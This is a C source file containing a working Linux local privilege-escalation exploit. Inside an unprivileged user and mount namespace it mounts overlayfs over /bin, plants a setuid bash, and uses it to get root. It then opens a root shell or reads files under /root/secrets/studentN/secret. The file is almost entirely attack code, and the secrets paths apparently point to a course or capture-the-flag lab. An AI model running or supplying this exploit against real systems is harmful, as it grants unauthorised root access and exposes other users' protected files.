#include <stdio.h>
#include <sched.h>
#include <stdlib.h>
#include <unistd.h>
#include <sched.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/mount.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sched.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/mount.h>
#include <sys/types.h>
#include <signal.h>
#include <fcntl.h>
#include <string.h>
#include <linux/sched.h>
#include <sys/wait.h>

#define BASH_CMD_SIZE (150)
#define CHILD_STACK_SIZE (1024 * 1024)

static char child_stack[CHILD_STACK_SIZE];

static int child_exec(void *stuff)
{
    system("rm -rf /tmp/haxhax");
    mkdir("/tmp/haxhax",    0777);
    mkdir("/tmp/haxhax/w",  0777);
    mkdir("/tmp/haxhax/u",  0777);
    mkdir("/tmp/haxhax/o",  0777);

    if (mount("overlay", "/tmp/haxhax/o", "overlay", MS_MGC_VAL,
                "lowerdir=/bin,upperdir=/tmp/haxhax/u,workdir=/tmp/haxhax/w") != 0) {
	    fprintf(stderr, "mount failed...\n");
    }

    chmod("/tmp/haxhax/w/work", 0777);
    chdir("/tmp/haxhax/o");
    chmod("bash", 04755);
    chdir("/");
    umount("/tmp/haxhax/o");
    return 0;
}

static int escalate_priv(char *bash_cmd)
{
    if (fork() == 0) {
        if (unshare(CLONE_NEWUSER) != 0) {
            fprintf(stderr, "failed to create new user namespace\n");
        }

        pid_t init = fork();
        if (init == 0) {
            pid_t pid
                = clone(child_exec, child_stack + CHILD_STACK_SIZE, CLONE_NEWNS | SIGCHLD, NULL);
            if (pid < 0) {
                fprintf(stderr, "failed to create new mount namespace\n");
                exit(-1);
            }
            waitpid(pid, NULL, 0);
        }
        waitpid(init, NULL, 0);
        return 0;
    }

    usleep(300000);
    wait(NULL);

    struct stat status;
    stat("/tmp/haxhax/u/bash", &status);
    if(status.st_mode == 0x89ed) {
        execl("/tmp/haxhax/u/bash", "bash", "-p", "-c", bash_cmd, NULL);
    }

    fprintf(stderr, "couldn't create suid :(\n");
    return -1;
}

int main(int argc, char **argv) {
    char bash_cmd[BASH_CMD_SIZE] =  "rm -rf /tmp/haxhax; "
                                    "python -c \""
                                    "import os; "
                                    "os.setresuid(0,0,0); "
                                    "os.execl(";
    if (argc > 1) {
        if (strcmp(argv[1], "--help") == 0 || strcmp(argv[1], "-h") == 0) {
            printf("usage: %s [--help|-h][--run-bash|-b][--secret-num|-n num of secret]\n", argv[0]);
            return 0;
        }
        if (strcmp(argv[1], "--run-bash") == 0 || strcmp(argv[1], "-b") == 0) {
            sprintf(bash_cmd, "%s'/bin/bash', 'bash');\"", bash_cmd);
        } else if (strcmp(argv[1], "--secret-num") == 0 || strcmp(argv[1], "-n") == 0) {
            if (argc < 3) {
                fprintf(stderr, "please provide a number to a secret\n");
                return -1;
            }
            if (atoi(argv[2]) < 1 || 32 < atoi(argv[2])) {
                fprintf(stderr, "there are only 32 secrets\n");
                return -1;
            }
            sprintf(bash_cmd, "%s'/bin/cat', 'cat', '/root/secrets/student%s/secret');\"", bash_cmd, argv[2]);
        }
    } else {
        sprintf(bash_cmd, "%s'/bin/cat', 'cat', '/root/secrets/student1/secret');\"", bash_cmd);
    }
    return escalate_priv(bash_cmd);
}